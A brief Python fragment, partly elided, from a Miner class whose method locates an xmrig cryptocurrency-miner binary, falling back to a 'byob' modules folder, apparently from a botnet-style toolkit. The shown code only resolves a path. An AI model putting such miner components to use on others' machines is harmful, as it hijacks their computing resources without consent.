...
class Miner:
    ...
    def _get_xmrig_binary(self):
        ...
        # If not found, check in byob modules
        if not os.path.isfile(xmrig_path):
            byob_path = os.path.join(os.path.dirname(os.path.dirname(os.path.dirname(module_dir))), 
                                    'byob', 'modules', 'xmrig', binary_name)
            if os.path.isfile(byob_path):
                xmrig_path = byob_path
